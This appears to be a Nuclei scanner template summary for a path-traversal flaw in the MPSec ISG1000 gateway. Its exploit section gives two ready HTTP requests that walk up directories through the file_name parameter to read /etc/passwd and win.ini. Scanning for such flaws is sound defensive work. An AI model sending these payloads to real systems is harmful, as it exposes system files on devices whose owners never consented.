# Nuclei Template: MPSec ISG1000 - Local File Inclusion
**Template ID:** mpsec-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`mpsec-lfi.yaml`)

## Vulnerability Information & PoC

## Description
MPSec ISG1000 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
GET {{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
```

## References
- https://twitter.com/sec715/status/1402884871173795842
